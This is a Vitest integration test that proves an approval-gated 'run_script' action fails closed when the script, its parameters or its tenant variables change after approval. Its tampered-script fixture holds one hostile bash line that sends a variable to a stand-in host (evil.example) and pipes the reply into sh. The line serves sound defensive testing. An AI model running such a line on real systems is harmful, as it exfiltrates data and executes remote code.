/**
 * Real-Postgres end-to-end proof of the effect-digest TOCTOU chain
 * (2026-08-05 tier3-supervised-four-eyes design §4.1,
 * services/actionIntents/effectDigest.ts).
 *
 * Before this file, `grep -rn "effectDigest\|effect_digest"` across every
 * integration suite returned NOTHING. The whole feature's only coverage was
 * unit tests that `vi.mock` `computeEffectDigest` wholesale and compare
 * `'a'.repeat(64)` against `'b'.repeat(64)` — which proves the worker
 * branches on inequality, and proves nothing at all about the property the
 * feature exists for. The actual chain
 *
 *     pin X at creation → the referenced content is edited → recompute ≠ X
 *
 * was never closed end to end: the resolver, the real `scripts` row it reads,
 * the digest column round-trip, and the release-time recompute had never once
 * run against a real database in the same test.
 *
 * What this drives, with only the tool-execution boundary faked:
 *   1. a REAL `scripts` row + a REAL pinned intent for it (`run_script`),
 *   2. approval through the REAL approve route,
 *   3. a REAL `UPDATE scripts SET content = ...`,
 *   4. the REAL release path (`releaseApprovedIntent` — the exact function
 *      the BullMQ processor calls),
 *   5. assert `failed` / `content_changed` AND that the tool never executed,
 *   6. the negative mirror: content untouched → releases to `completed`.
 *
 * Two properties nothing else in the repo can catch:
 *
 *   - SUPERVISED INTENTS ARE PINNED. `run_script` is classified
 *     `supervised` (aiGuardrails.ts's TIER3_SUPERVISED_TOOLS), and pinning
 *     used to be gated on `approvalScope === 'four_eyes'` — which made this
 *     very resolver unreachable dead code while leaving the ~10-minute
 *     RELEASE_LEASE_MS window open to exactly this edit. Test 1 fails if that
 *     gate ever comes back.
 *
 *   - THE `withSystemDbAccessContext` WRAP AROUND THE RECOMPUTE. Every unit
 *     test stubs that wrap as an identity passthrough, so deleting it breaks
 *     no test — but in production `db` outside any context falls back to the
 *     GUC-less pool, RLS silently filters the resolver's read to zero rows,
 *     every recompute resolves "target absent" → null, and 100% of pinned
 *     releases fail `content_changed`. The negative-mirror test below is the
 *     only thing anywhere that would go red: it needs the recompute to
 *     actually SEE the unchanged script row.
 *
 * SINCE #3409 PR4c-1 the digest also pins the script's PARAMETER DEFINITIONS
 * and a REFERENCE (never a value) to every tenant variable the run will
 * consult, and this suite is the only place either one meets a real database.
 * The fixture's script therefore references two real `tenant_variables` rows —
 * one partner-wide through a `{{var.*}}` content token, one org-owned through
 * a `tenantVariable`-bound parameter — because a script with no token and null
 * `parameters` short-circuits `scriptNeedsVariableScope` and loads no scope at
 * all, which would leave every variable case below asserting against an empty
 * pinned reference set. `assertFixtureResolvesVariables` re-checks that on
 * every test so the fixture cannot silently hollow out.
 *
 * Lives under `src/__tests__/integration/`, already covered by
 * `vitest.integration.config.ts`'s `src/__tests__/integration/**` include
 * glob and by `vitest.config.ts`'s wholesale exclude of the same path — no
 * per-file dual hand-list entry needed. Named in the integration config
 * anyway for discoverability (the pattern `staleBackupReaper.
 * integration.test.ts` uses).
 */
import './setup';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { randomUUID } from 'crypto';
import { eq } from 'drizzle-orm';
import { Hono } from 'hono';
import type { ScriptParameterDefinition } from '@breeze/shared';

// The ONLY fake in this file: the tool-execution boundary. Everything the
// feature under test touches — the resolver's SELECT, the effect_digest
// column round-trip, the release CAS, the revalidation ladder, the
// system-scoped recompute — runs for real against Postgres. Partial mock via
// importOriginal so the rest of services/aiTools (the registry
// checkGuardrails and resolveWritableToolOrgId read, requiresLiveSession the
// worker calls) stays genuine; mocking the module wholesale would make
// `run_script` look unregistered and the worker would false-fail
// `session_required` before ever reaching the digest check.
const h = vi.hoisted(() => ({
  executeTool: vi.fn(async () => JSON.stringify({ results: {} })),
}));

vi.mock('../../services/aiTools', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../services/aiTools')>();
  return { ...actual, executeTool: h.executeTool };
});

import { db, withSystemDbAccessContext } from '../../db';
import { getTestDb } from './setup';
import { actionIntents } from '../../db/schema/actionIntents';
import { devices } from '../../db/schema/devices';
import { scripts } from '../../db/schema/scripts';
import { tenantVariables } from '../../db/schema/tenantVariables';
import { createActionIntent } from '../../services/actionIntents/intentService';
import { computeEffectDigest } from '../../services/actionIntents/effectDigest';
import { buildRunScriptSnapshot } from '../../services/actionIntents/runScriptSnapshot';
import { encryptTenantVariableValue } from '../../services/tenantVariables';
import { loadTenantVariableScope, resolveForOrg } from '../../services/tenantVariableResolution';
import { PERMISSIONS } from '../../services/permissions';
import { buildOrgAccessClosures, type AuthContext } from '../../middleware/auth';
import { createAccessToken, type TokenPayload } from '../../services/jwt';
import {
  assignUserToOrganization,
  createOrganization,
  createPartner,
  createRole,
  createSite,
  createUser,
  grantRolePermissions,
} from './db-utils';
import { approvalRoutes } from '../../routes/approvals';
import { releaseApprovedIntent } from '../../jobs/intentReleaseWorker';

const runDb = it.runIf(!!process.env.DATABASE_URL);

/**
 * `run_script` is the module's motivating example AND is classified
 * SUPERVISED — which is precisely why it belongs here rather than a
 * four_eyes tool: it is the surface the old four_eyes-only gate silently
 * left unpinned. TOOL_PERMISSIONS maps it to scripts:execute, which the
 * requester needs both to create the intent and to survive the release
 * worker's requester-RBAC revalidation.
 */
const TOOL_NAME = 'run_script';

/**
 * THE FIXTURE MUST REFERENCE TENANT VARIABLES, or every variable assertion
 * below is vacuous (#3409 PR4c-1).
 *
 * `buildRunScriptSnapshot` gates the whole variable-loading path on
 * `scriptNeedsVariableScope({ content, parameters })`. A script with neither a
 * `{{var.*}}` content token nor a `tenantVariable`-bound parameter loads an
 * EMPTY scope without querying, pins an empty `variableReferences`, and would
 * make "rotate the variable → content_changed" pass or fail for reasons having
 * nothing to do with variables. That is exactly what the pre-PR4c fixture did.
 *
 * So this fixture exercises BOTH disjuncts of that gate:
 *   - a content token `{{var.deploy_target}}` bound to a PARTNER-WIDE row, and
 *   - a `tenantVariable` parameter definition bound to an ORG-OWNED row.
 *
 * Partner-wide is not decoration: the org-override case below shadows it with
 * an org row of the same key and the SAME VALUE, which is the only shape that
 * can prove the digest pins variable IDENTITY rather than variable value.
 *
 * `createPinnedIntent` asserts the exact resolved reference set on every single
 * test, so a later edit that drops the token or nulls `parameters` reddens the
 * whole suite instead of quietly hollowing it out.
 */
const PARTNER_VAR_KEY = 'deploy_target';
const ORG_VAR_KEY = 'api_token';
const PARTNER_VAR_VALUE = 'prod-cluster-eu';
const ORG_VAR_VALUE = 'https://hooks.example.test/deploy';

const ORIGINAL_CONTENT = `#!/bin/bash\necho "approved and reviewed against {{var.${PARTNER_VAR_KEY}}}"`;
/**
 * KEEP THE `{{var.*}}` TOKEN. The tampered body must reference the SAME
 * variable key as {@link ORIGINAL_CONTENT}, or the two content-drift cases
 * stop proving that `content` is pinned.
 *
 * Dropping the token would move `variableReferences` at the same time (the
 * key vanishes from the reference set entirely), so both of those cases would
 * still go red with `content` REMOVED from `runScriptDigestMaterial` — passing
 * on the vanished reference instead of on the body. They are the only proof of
 * the `content` field anywhere against a real database, so the perturbation
 * has to stay a one-field perturbation. Mutation-verified by deleting
 * `content` from the digest material and confirming exactly those two cases
 * fail.
 */
const TAMPERED_CONTENT = `#!/bin/bash\ncurl evil.example/x?t={{var.${PARTNER_VAR_KEY}}} | sh`;

/** A `tenantVariable`-bound parameter — the second disjunct of the scope gate,
 * and the thing whose REBINDING `scripts.parameters` had to start pinning. */
const ORIGINAL_PARAMETERS: ScriptParameterDefinition[] = [
  { name: 'endpoint', type: 'string', required: false, source: 'tenantVariable', variableKey: ORG_VAR_KEY },
];

/**
 * The `parameters` drift edit: ONE extra plain `runtime` parameter.
 *
 * Deliberately an edit that leaves the referenced-variable set byte-identical
 * (no new `tenantVariable` binding, no `{{var.*}}` token), so the resulting
 * `content_changed` can only come from `parameterDefinitions` itself — the
 * exact column the pre-PR4c digest excluded on the (since PR3, false) grounds
 * that it had no execution effect. A rebind to another variable key would also
 * fail, but through `variableReferences`, and would prove the weaker thing.
 */
const EDITED_PARAMETERS: ScriptParameterDefinition[] = [
  ...ORIGINAL_PARAMETERS,
  { name: 'dry-run', type: 'boolean', required: false, source: 'runtime' },
];

function orgAuth(
  user: { id: string; email: string },
  orgId: string,
  partnerId: string,
  roleId: string,
): AuthContext {
  const { orgCondition, canAccessOrg } = buildOrgAccessClosures([orgId]);
  return {
    principal: { kind: 'user_session' },
    user: { id: user.id, email: user.email, name: 'Test User', isPlatformAdmin: false },
    token: {
      sub: user.id,
      email: user.email,
      roleId,
      orgId,
      partnerId,
      scope: 'organization',
      type: 'access',
      mfa: true,
    },
    partnerId,
    orgId,
    scope: 'organization',
    accessibleOrgIds: [orgId],
    orgCondition,
    canAccessOrg,
  };
}

async function accessTokenFor(
  user: { id: string; email: string },
  orgId: string,
  partnerId: string,
  roleId: string,
): Promise<string> {
  const payload: Omit<TokenPayload, 'type'> = {
    sub: user.id,
    email: user.email,
    roleId,
    orgId,
    partnerId,
    scope: 'organization',
    mfa: false,
    aep: 1,
    mep: 1,
    sid: randomUUID(),
  };
  return createAccessToken(payload);
}

interface Scenario {
  partnerId: string;
  orgId: string;
  requester: { id: string; email: string };
  requesterRoleId: string;
  scriptId: string;
  deviceId: string;
  /** `tenant_variables` row for {@link PARTNER_VAR_KEY} — partner-wide (org_id IS NULL). */
  partnerVariableId: string;
  /** `tenant_variables` row for {@link ORG_VAR_KEY} — org-owned. */
  orgVariableId: string;
}

/**
 * One `tenant_variables` row, sealed through the service's own
 * `encryptTenantVariableValue`.
 *
 * The id is generated HERE, before the insert, because the AAD binds the
 * ciphertext to `tenant_variables.value:<row id>` — a plaintext literal (or a
 * ciphertext sealed under a different id) fails to decrypt at resolution time,
 * silently drops the row out of the scope, and would turn every `present`
 * reference below into an `unreadable` one.
 */
async function insertVariable(options: {
  orgId?: string | null;
  partnerId?: string | null;
  key: string;
  value: string;
  isSecret?: boolean;
}): Promise<string> {
  const id = randomUUID();
  await getTestDb()
    .insert(tenantVariables)
    .values({
      id,
      orgId: options.orgId ?? null,
      partnerId: options.partnerId ?? null,
      key: options.key,
      value: encryptTenantVariableValue(id, options.value),
      isSecret: options.isSecret ?? false,
    });
  return id;
}

async function readVariable(id: string) {
  const [row] = await getTestDb().select().from(tenantVariables).where(eq(tenantVariables.id, id)).limit(1);
  return row!;
}

/** The resolved value an org sees for a key, straight through the production
 * resolver — used to prove the org-override case changed IDENTITY only. */
async function resolvedValueFor(orgId: string, key: string): Promise<string | undefined> {
  const scope = await loadTenantVariableScope([orgId]);
  return resolveForOrg(scope, orgId).get(key)?.value;
}

/**
 * One org, one requester holding scripts:execute (supervised needs no
 * approvals:decide — the requester self-approves), one REAL org-owned script
 * row and one REAL device to target. Inserted through the superuser test
 * client because the fixture predates any request context.
 *
 * The device became load-bearing in #3409 PR4c-1: the digest now pins the set
 * of ORGS the run fans out to (they determine which tenant variables resolve),
 * so the snapshot builder resolves every `deviceIds` entry to an org and fails
 * closed — `target_absent`, unpinned intent — on any it cannot. A synthetic
 * UUID, which is what this fixture used to pass, would silently make every
 * assertion below vacuous.
 */
async function seedScenario(): Promise<Scenario> {
  const partner = await createPartner();
  const org = await createOrganization({ partnerId: partner.id });

  const role = await createRole({ scope: 'organization', orgId: org.id });
  await grantRolePermissions(role.id, [PERMISSIONS.SCRIPTS_EXECUTE]);

  const requester = await createUser({
    partnerId: partner.id,
    orgId: org.id,
    email: `requester-${randomUUID()}@effectdigest.test`,
  });
  await assignUserToOrganization(requester.id, org.id, role.id);

  const [script] = await getTestDb()
    .insert(scripts)
    .values({
      orgId: org.id,
      name: `toctou-${randomUUID()}`,
      osTypes: ['linux'],
      language: 'bash',
      content: ORIGINAL_CONTENT,
      // Not null, and not decoration: `parameters` is the second disjunct of
      // the variable-scope gate AND is itself pinned since #3409 PR4c-1.
      parameters: ORIGINAL_PARAMETERS,
      runAs: 'user',
      timeoutSeconds: 300,
    })
    .returning({ id: scripts.id });

  const site = await createSite({ orgId: org.id });
  const [device] = await getTestDb()
    .insert(devices)
    .values({
      orgId: org.id,
      siteId: site!.id,
      agentId: randomUUID(),
      hostname: `toctou-${randomUUID().slice(0, 8)}`,
      osType: 'linux',
      osVersion: '24.04',
      architecture: 'x86_64',
      agentVersion: '0.0.0-test',
      status: 'online',
      enrolledAt: new Date(),
    })
    .returning({ id: devices.id });

  // The two rows the script actually references. Partner-wide for the content
  // token (so an org override can shadow it later), org-owned for the bound
  // parameter.
  const partnerVariableId = await insertVariable({
    partnerId: partner.id,
    key: PARTNER_VAR_KEY,
    value: PARTNER_VAR_VALUE,
  });
  const orgVariableId = await insertVariable({
    orgId: org.id,
    key: ORG_VAR_KEY,
    value: ORG_VAR_VALUE,
  });

  return {
    partnerId: partner.id,
    orgId: org.id,
    requester: { id: requester.id, email: requester.email },
    requesterRoleId: role.id,
    scriptId: script!.id,
    deviceId: device!.id,
    partnerVariableId,
    orgVariableId,
  };
}

/** Creates the intent and asserts it really was PINNED — the precondition
 * every assertion below depends on. A null digest here would make both tests
 * vacuous (the release paths skip the check entirely on NULL), so it is
 * checked explicitly rather than inferred. */
async function createPinnedIntent(s: Scenario): Promise<{ intentId: string; approvalRowId: string; digest: string }> {
  const auth = orgAuth(s.requester, s.orgId, s.partnerId, s.requesterRoleId);
  const snapshot = await createActionIntent(auth, {
    toolName: TOOL_NAME,
    // A REAL device: the digest pins the orgs the run fans out to, so the
    // snapshot resolves each id and refuses to pin when one does not exist.
    // (createActionIntent still does not AUTHORIZE the device — that stays the
    // tool handler's job at execution time.)
    input: { scriptId: s.scriptId, deviceIds: [s.deviceId] },
    source: 'chat',
  });
  expect(snapshot.status).toBe('pending_approval');
  // Supervised shape: exactly one approval row, owned by the requester.
  expect(snapshot.approvalRequestIds).toHaveLength(1);
  expect(snapshot.requesterApprovalRequestId).toBeTruthy();

  const row = await readIntent(snapshot.id);
  expect(row.approvalScope).toBe('supervised');
  // THE scope-independence property: a supervised intent IS pinned. If the
  // old `approvalScope === 'four_eyes'` gate is ever restored, this is null
  // and the whole suite goes red instead of silently passing.
  expect(row.effectDigest).toMatch(/^[0-9a-f]{64}$/);

  await assertFixtureResolvesVariables(s);

  return {
    intentId: snapshot.id,
    approvalRowId: snapshot.requesterApprovalRequestId!,
    digest: row.effectDigest!,
  };
}

/**
 * THE ANTI-VACUITY GUARD. Every variable case below is a "change one thing,
 * expect content_changed" test, and every one of them would pass for the wrong
 * reason — or fail to distinguish anything at all — if the digest had pinned an
 * EMPTY reference set to begin with.
 *
 * So this asserts the exact set, on every test, through the same
 * `buildRunScriptSnapshot` the digest is computed from: two `present`
 * references, resolved from the two REAL rows, carrying the identity fields
 * (`variableId`, `version`, `isSecret`, `ownerScope`) that the drift cases each
 * perturb one of. Sorted by (orgId, key), so `api_token` precedes
 * `deploy_target` by code point.
 *
 * A regression that removes the `{{var.*}}` token, nulls `parameters`, or
 * short-circuits `scriptNeedsVariableScope` reddens here with a concrete diff,
 * rather than leaving six green tests that prove nothing.
 */
async function assertFixtureResolvesVariables(s: Scenario): Promise<void> {
  const built = await withSystemDbAccessContext(() =>
    buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
  );
  expect(built.kind).toBe('snapshot');
  if (built.kind !== 'snapshot') return;
  expect(built.snapshot.variableReferences).toEqual([
    {
      orgId: s.orgId,
      key: ORG_VAR_KEY,
      state: 'present',
      variableId: s.orgVariableId,
      version: 1,
      isSecret: false,
      ownerScope: 'organization',
    },
    {
      orgId: s.orgId,
      key: PARTNER_VAR_KEY,
      state: 'present',
      variableId: s.partnerVariableId,
      version: 1,
      isSecret: false,
      ownerScope: 'partner',
    },
  ]);
  // And the values really did decrypt — an AAD mismatch would present as
  // `unreadable` above, but assert it directly so the failure names the cause.
  const resolved = resolveForOrg(built.scope, s.orgId);
  expect(resolved.get(PARTNER_VAR_KEY)?.value).toBe(PARTNER_VAR_VALUE);
  expect(resolved.get(ORG_VAR_KEY)?.value).toBe(ORG_VAR_VALUE);
}

async function approveViaRoute(s: Scenario, approvalRowId: string): Promise<Response> {
  const token = await accessTokenFor(s.requester, s.orgId, s.partnerId, s.requesterRoleId);
  const app = new Hono();
  app.route('/approvals', approvalRoutes);
  return app.request(`/approvals/${approvalRowId}/approve`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
}

async function readIntent(intentId: string) {
  return withSystemDbAccessContext(async () => {
    const [row] = await db.select().from(actionIntents).where(eq(actionIntents.id, intentId)).limit(1);
    return row!;
  });
}

/** A genuine post-approval edit by some other actor, through the superuser
 * client (no request context, mirroring "somebody edited it in the UI while
 * the intent sat approved"). */
async function editScript(
  scriptId: string,
  patch: Partial<{
    content: string;
    runAs: 'system' | 'user' | 'elevated';
    parameters: ScriptParameterDefinition[];
  }>,
) {
  await getTestDb().update(scripts).set(patch).where(eq(scripts.id, scriptId));
}

/**
 * pin → approve → let `drift` happen → release. The six #3409 PR4c-1 cases
 * differ ONLY in `drift`, so the ladder is written once: an inlined copy per
 * case is where a missing "did it actually reach `approved`?" check hides, and
 * an intent that never got approved fails release for an unrelated reason
 * while still landing on `failed`.
 */
async function approveThenDriftThenRelease(s: Scenario, drift: () => Promise<void>) {
  const { intentId, approvalRowId, digest } = await createPinnedIntent(s);
  expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
  expect((await readIntent(intentId)).status).toBe('approved');

  await drift();

  await releaseApprovedIntent(intentId);
  return { released: await readIntent(intentId), pinnedDigest: digest };
}

/** Fail CLOSED: the intent is `failed`/`content_changed`, nothing executed, and
 * `executedAt` stays null (the reaper's "never ran" vs "ran and we lost the
 * result" discriminator). */
function expectFailedClosed(released: Awaited<ReturnType<typeof readIntent>>) {
  expect(released.status).toBe('failed');
  expect(released.errorCode).toBe('content_changed');
  expect(released.executedAt).toBeNull();
  expect(h.executeTool).not.toHaveBeenCalled();
}

let seeded: Scenario | null = null;

beforeEach(async () => {
  h.executeTool.mockClear();
  h.executeTool.mockResolvedValue(JSON.stringify({ results: {} }));
  seeded = await seedScenario();
});

afterEach(() => {
  seeded = null;
  vi.clearAllMocks();
});

describe('effect-digest TOCTOU chain (real Postgres, real resolver, real release path)', () => {
  runDb('script body edited after approval → release fails content_changed and the tool NEVER executes', async () => {
    const s = seeded!;
    const { intentId, approvalRowId } = await createPinnedIntent(s);

    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
    const approved = await readIntent(intentId);
    expect(approved.status).toBe('approved');

    // The drift: a REAL UPDATE against the REAL row the digest was pinned
    // from. Nothing about the intent changes — its arguments, and therefore
    // its argument_digest, stay byte-identical. This is exactly the gap
    // argument_digest alone cannot see.
    await editScript(s.scriptId, { content: TAMPERED_CONTENT });

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('failed');
    expect(released.errorCode).toBe('content_changed');
    // Fail CLOSED: the revalidation stop must happen before execution, so
    // executedAt stays null (the reaper's contract distinguishes "never ran"
    // from "ran and we lost the result" on exactly this field).
    expect(released.executedAt).toBeNull();
    expect(h.executeTool).not.toHaveBeenCalled();
  });

  // FIX 4's property, end to end: `content` alone was not enough. Flipping
  // run_as from `user` to `system` is a privilege escalation that leaves the
  // script body byte-identical — under the old content-only digest this
  // released happily.
  runDb('run_as flipped user → system after approval is caught, even with the body untouched', async () => {
    const s = seeded!;
    const { intentId, approvalRowId } = await createPinnedIntent(s);
    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);

    await editScript(s.scriptId, { runAs: 'system' });

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('failed');
    expect(released.errorCode).toBe('content_changed');
    expect(h.executeTool).not.toHaveBeenCalled();
  });

  // ---------------------------------------------------------------------
  // #3409 PR4c-1: the digest pins the script's PARAMETER DEFINITIONS and a
  // REFERENCE to every tenant variable the run will consult. Each case below
  // perturbs exactly one of those and nothing else — the script body, the
  // run_as, the device set and the intent's own arguments stay byte-identical
  // throughout, so `argument_digest` and the pre-PR4c five-field effect digest
  // are both blind to every one of them.
  // ---------------------------------------------------------------------

  // ROTATION. The operator changes the variable's value; the service bumps
  // `version`. The VALUE is deliberately not in the digest material (the
  // column is widely readable and must never be reconstructible into tenant
  // plaintext), so `version` is the entire observable — pin it or rotation is
  // invisible.
  runDb('a bound tenant variable rotated (value + version bump) after approval → content_changed', async () => {
    const s = seeded!;
    const { released } = await approveThenDriftThenRelease(s, async () => {
      const before = await readVariable(s.orgVariableId);
      await getTestDb()
        .update(tenantVariables)
        .set({
          value: encryptTenantVariableValue(s.orgVariableId, 'https://hooks.example.test/rotated'),
          version: before.version + 1,
        })
        .where(eq(tenantVariables.id, s.orgVariableId));
      const after = await readVariable(s.orgVariableId);
      // The drift really happened, and it is a version bump — not a no-op
      // UPDATE that would make the assertion below meaningless.
      expect(after.version).toBe(before.version + 1);
    });

    expectFailedClosed(released);
  });

  // RECLASSIFICATION. `isSecret` flipping false → true changes how the value
  // reaches the device (redacted env delivery instead of inline substitution),
  // and NOTHING else about the row moves: same id, same version, same
  // ciphertext. A digest that pinned `{variableId, version}` alone — the shape
  // the schema comment originally described — releases this happily.
  runDb('isSecret flipped on a bound variable WITHOUT a version bump → content_changed', async () => {
    const s = seeded!;
    const { released } = await approveThenDriftThenRelease(s, async () => {
      const before = await readVariable(s.orgVariableId);
      expect(before.isSecret).toBe(false);
      await getTestDb()
        .update(tenantVariables)
        .set({ isSecret: true })
        .where(eq(tenantVariables.id, s.orgVariableId));

      const after = await readVariable(s.orgVariableId);
      expect(after.isSecret).toBe(true);
      // THE WHOLE POINT of this case: everything a version-only pin would
      // have looked at is unchanged. If a trigger (or a future service
      // change) ever starts bumping version on an isSecret flip, this test
      // silently degenerates into a duplicate of the rotation case above —
      // so assert it, rather than assume it.
      expect(after.version).toBe(before.version);
      expect(after.value).toBe(before.value);
      expect(after.key).toBe(before.key);
    });

    expectFailedClosed(released);
  });

  // IDENTITY, NOT VALUE. An org override with the SAME key and the SAME value
  // as the partner-wide row it shadows. Resolution returns a byte-identical
  // string before and after — asserted below, so this cannot pass by
  // accidentally changing the value — yet the run now consults a DIFFERENT
  // ROW: different `variableId`, `ownerScope` partner → organization. Only a
  // digest that pins the reference can see this at all.
  runDb('an org override shadowing a partner-wide variable with the SAME value → content_changed', async () => {
    const s = seeded!;
    let overrideId = '';
    const { released } = await approveThenDriftThenRelease(s, async () => {
      expect(await resolvedValueFor(s.orgId, PARTNER_VAR_KEY)).toBe(PARTNER_VAR_VALUE);

      overrideId = await insertVariable({
        orgId: s.orgId,
        key: PARTNER_VAR_KEY,
        // Same plaintext, sealed under the new row's own id.
        value: PARTNER_VAR_VALUE,
      });
      expect(overrideId).not.toBe(s.partnerVariableId);

      // The value the run resolves is unchanged; only which row supplied it
      // moved. A `content_changed` here therefore cannot be attributed to a
      // value difference — there isn't one.
      expect(await resolvedValueFor(s.orgId, PARTNER_VAR_KEY)).toBe(PARTNER_VAR_VALUE);
    });

    expectFailedClosed(released);
  });

  // DELETION → the `absent` sentinel. The reference set still has an entry for
  // the key (state `absent`), which is why deletion is detectable at all: a
  // resolver that simply omitted missing keys would shrink the list to the
  // remaining reference and, for a single-variable script, back to `[]` —
  // indistinguishable from a script that never referenced anything.
  runDb('a bound tenant variable deleted after approval → content_changed', async () => {
    const s = seeded!;
    const { released } = await approveThenDriftThenRelease(s, async () => {
      await getTestDb().delete(tenantVariables).where(eq(tenantVariables.id, s.orgVariableId));
      expect(await resolvedValueFor(s.orgId, ORG_VAR_KEY)).toBeUndefined();
    });

    expectFailedClosed(released);
  });

  // THE PRE-EXISTING DRIFT BUG. `scripts.parameters` was excluded from the
  // digest on the stated grounds that the handler passes the tool call's own
  // `input.parameters` and never reads the column — true until #3409 PR3 made
  // the column drive `scriptNeedsVariableScope` and every `tenantVariable`
  // binding at dispatch. This case was RED before the column was pinned.
  //
  // The edit adds one plain `runtime` parameter, so the referenced-variable
  // set is provably untouched (asserted) and `parameterDefinitions` is the
  // only thing that moved.
  runDb('the script\'s parameters column edited after approval → content_changed', async () => {
    const s = seeded!;
    const { released } = await approveThenDriftThenRelease(s, async () => {
      const before = await withSystemDbAccessContext(() =>
        buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
      );
      await editScript(s.scriptId, { parameters: EDITED_PARAMETERS });
      const after = await withSystemDbAccessContext(() =>
        buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
      );

      if (before.kind !== 'snapshot' || after.kind !== 'snapshot') throw new Error('snapshot did not build');
      // Isolation: the variable references and the script body are identical
      // across the edit, so the release below can only fail on the parameter
      // definitions.
      expect(after.snapshot.variableReferences).toEqual(before.snapshot.variableReferences);
      expect(after.snapshot.script).toEqual(before.snapshot.script);
      expect(after.snapshot.parameterDefinitions).not.toBe(before.snapshot.parameterDefinitions);
    });

    expectFailedClosed(released);
  });

  // THE negative mirror — one, not two. Since the fixture now references two
  // real tenant variables, "untouched script" and "untouched variables" are
  // the same no-drift run, and a separate variables-only copy asserted a
  // strict subset of what this one does.
  //
  // It is the ONLY coverage anywhere of the `withSystemDbAccessContext` wrap
  // around the release-time recompute: delete that wrap and the resolver's
  // read is RLS-filtered to zero rows, every recompute returns null, and this
  // test — not the failure cases above — is what goes red. It is equally the
  // only thing that catches a NONDETERMINISTIC reference set across the two
  // computations (an unstable sort, a `localeCompare` creeping back in, or a
  // resolution that depends on which DB context is ambient: creation runs
  // inside the intent transaction, release inside the worker's own system
  // context). Every failure case above stays green under either bug.
  runDb('script and variables untouched → the digest still matches and the release executes normally', async () => {
    const s = seeded!;
    const { intentId, approvalRowId, digest } = await createPinnedIntent(s);

    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);

    await releaseApprovedIntent(intentId);

    const released = await readIntent(intentId);
    expect(released.status).toBe('completed');
    expect(released.errorCode).toBeNull();
    expect(released.executedAt).not.toBeNull();
    expect(h.executeTool).toHaveBeenCalledTimes(1);
    // FOUR arguments since #3409 PR4c-1: the worker hands dispatch the
    // `ToolExecutionContext` carrying the VERY observation the recompute just
    // compared, instead of letting the handler re-read the script and
    // re-resolve the variables (which would reopen the check/use window the
    // digest exists to close). Asserting the 4th argument — not
    // `expect.anything()` — is what makes that hand-off a tested property:
    // drop the `{ context }` and this goes red.
    expect(h.executeTool).toHaveBeenCalledWith(
      TOOL_NAME,
      expect.objectContaining({ scriptId: s.scriptId }),
      expect.anything(),
      expect.objectContaining({
        context: expect.objectContaining({
          verifiedRunScript: expect.objectContaining({
            scriptRow: expect.objectContaining({ id: s.scriptId, content: ORIGINAL_CONTENT }),
            snapshot: expect.objectContaining({
              // The same variable references the digest was pinned over reach
              // dispatch — one observation, not two.
              variableReferences: [
                expect.objectContaining({ key: ORG_VAR_KEY, variableId: s.orgVariableId, state: 'present' }),
                expect.objectContaining({ key: PARTNER_VAR_KEY, variableId: s.partnerVariableId, state: 'present' }),
              ],
            }),
          }),
        }),
      }),
    );
    // The stored digest is unchanged by a successful release — it is a
    // creation-time pin, never rewritten.
    expect(released.effectDigest).toBe(digest);
  });

  // Guards the resolver's own contract against the real schema rather than a
  // fake `Database`: the digest the CREATION path stored must be exactly what
  // the RELEASE path recomputes from the same untouched row, and must change
  // when the row changes. If a column is renamed or dropped out from under
  // the resolver, effectDigest.test.ts's hand-built row objects would keep
  // passing — this would not.
  runDb('the resolver round-trips against the real scripts schema', async () => {
    const s = seeded!;
    const { digest } = await createPinnedIntent(s);
    // Same args the intent carries — the pinned org set is derived from these,
    // so a different device id would legitimately produce a different digest.
    const args = { scriptId: s.scriptId, deviceIds: [s.deviceId] };

    const recomputed = await withSystemDbAccessContext(() => computeEffectDigest(TOOL_NAME, args, db));
    expect(recomputed).toBe(digest);

    await editScript(s.scriptId, { content: TAMPERED_CONTENT });
    const afterEdit = await withSystemDbAccessContext(() => computeEffectDigest(TOOL_NAME, args, db));
    expect(afterEdit).toMatch(/^[0-9a-f]{64}$/);
    expect(afterEdit).not.toBe(digest);
  });
});
